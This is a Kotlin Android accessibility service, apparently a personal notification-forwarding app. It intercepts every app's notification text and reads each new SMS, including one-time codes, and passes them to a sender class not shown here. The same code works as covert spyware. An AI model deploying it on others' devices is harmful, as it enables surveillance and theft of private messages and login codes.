package com.example.notiforwarder444

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.content.Intent
import android.content.IntentFilter
import android.database.ContentObserver
import android.net.Uri
import android.os.BatteryManager
import android.os.Handler
import android.provider.Telephony
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class NotiAccessibilityService : AccessibilityService() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var smsObserver: ContentObserver? = null
    private var lastSentSmsId: Long = -1

    override fun onServiceConnected() {
        super.onServiceConnected()
        Sender.init(this)
        LogManager.add("AccessibilityService connected")
        scope.launch {
            Sender.drainQueue()
        }
        registerSmsObserver()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) return

        val packageName = event.packageName?.toString() ?: return

        // فیلتر incallui (درخواستی شما)
        if (packageName == "com.android.incallui") {
            LogManager.add("Filtered out: $packageName")
            return
        }

        // فیلتر کردن برنامهٔ پیش‌فرض پیامک (برای جلوگیری از ارسال تکراری)
        if (packageName == getDefaultSmsAppPackage()) {
            LogManager.add("SMS notification filtered (direct read active)")
            return
        }

        LogManager.add("Event received from: $packageName")

        val notification = event.parcelableData
        if (notification !is Notification) {
            LogManager.add("parcelableData is not Notification")
            return
        }

        val extras = notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val time = event.eventTime

        val appName = getAppName(packageName)
        val battery = getBatteryLevel()

        LogManager.add("Sending: $appName, batt=$battery%")
        scope.launch {
            Sender.send(appName, packageName, title, text, time, battery)
        }
    }

    // ========== خواندن مستقیم پیامک‌ها ==========
    private fun registerSmsObserver() {
        smsObserver = object : ContentObserver(Handler()) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                readLatestSms()
            }
        }
        contentResolver.registerContentObserver(
            Telephony.Sms.Inbox.CONTENT_URI,
            true,
            smsObserver!!
        )
        LogManager.add("SMS observer registered")
        // خواندن آخرین پیامک موجود برای تنظیم شناسه
        readLatestSms(updateLastIdOnly = true)
    }

    private fun readLatestSms(updateLastIdOnly: Boolean = false) {
        scope.launch {
            withContext(Dispatchers.IO) {
                try {
                    val cursor = contentResolver.query(
                        Telephony.Sms.Inbox.CONTENT_URI,
                        arrayOf("_id", "address", "body", "date"),
                        null,
                        null,
                        "date DESC"
                    )
                    cursor?.use {
                        if (it.moveToFirst()) {
                            val id = it.getLong(0)
                            if (updateLastIdOnly) {
                                lastSentSmsId = id
                                LogManager.add("SMS observer initialized with id=$id")
                                return@withContext
                            }
                            // اگر پیام جدید است (شناسه بزرگتر از آخرین ارسالی)
                            if (id > lastSentSmsId) {
                                lastSentSmsId = id
                                val address = it.getString(1) ?: "ناشناس"
                                val body = it.getString(2) ?: ""
                                val date = it.getLong(3)
                                LogManager.add("New SMS from $address")
                                // ارسال به کانال
                                Sender.send(
                                    "پیامک دریافتی",
                                    "com.android.sms",
                                    address,
                                    body,
                                    date,
                                    getBatteryLevel()
                                )
                            }
                        }
                    }
                } catch (e: Exception) {
                    LogManager.add("SMS read error: ${e.message}")
                }
            }
        }
    }

    private fun getDefaultSmsAppPackage(): String? {
        return try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                Telephony.Sms.getDefaultSmsPackage(this)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }
    // ===========================================

    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        if (batteryIntent != null) {
            val level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            if (level >= 0 && scale > 0) {
                return (level * 100 / scale)
            }
        }
        return -1
    }

    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        smsObserver?.let {
            contentResolver.unregisterContentObserver(it)
        }
        job.cancel()
        LogManager.add("AccessibilityService destroyed")
    }
}
